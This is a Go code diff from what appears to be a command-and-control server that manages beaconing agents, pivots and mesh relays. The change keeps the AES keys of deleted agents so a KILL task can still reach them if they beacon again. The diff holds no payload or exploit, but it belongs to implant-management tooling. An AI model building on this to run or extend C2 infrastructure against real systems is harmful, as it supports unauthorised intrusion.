@@ -70,6 +70,12 @@ type Server struct {
 
 	meshMu    sync.RWMutex
 	meshPeers map[string]meshPeer // agentID → peer info
+
+	// ghostMu guards ghostAgents. When an agent is deleted from the DB its AES
+	// key is kept here so we can still send it a KILL task if it beacons again,
+	// preventing the 404→re-register loop.
+	ghostMu     sync.Mutex
+	ghostAgents map[string][]byte // agentID → AESKey
 }
 
 // registerPendingPivot records that agentID is about to deploy a child to targetIP.
@@ -103,6 +109,31 @@ func (s *Server) claimPendingPivot(ip string) string {
 		return ""
 	}
 	return p.parentID
+}
+
+// ghostAgent saves an agent's AES key before DB deletion so any future beacon
+// from that agent still gets a KILL response instead of triggering re-registration.
+func (s *Server) ghostAgent(agentID string, aesKey []byte) {
+	s.ghostMu.Lock()
+	defer s.ghostMu.Unlock()
+	if s.ghostAgents == nil {
+		s.ghostAgents = make(map[string][]byte)
+	}
+	keyCopy := make([]byte, len(aesKey))
+	copy(keyCopy, aesKey)
+	s.ghostAgents[agentID] = keyCopy
+}
+
+// getGhostKey returns the AES key for a previously-deleted agent and removes it
+// from the map (one-shot: after delivering the KILL the ghost is forgotten).
+func (s *Server) getGhostKey(agentID string) ([]byte, bool) {
+	s.ghostMu.Lock()
+	defer s.ghostMu.Unlock()
+	key, ok := s.ghostAgents[agentID]
+	if ok {
+		delete(s.ghostAgents, agentID)
+	}
+	return key, ok
 }
 
 // registerMeshPeer records an agent as an active relay peer.
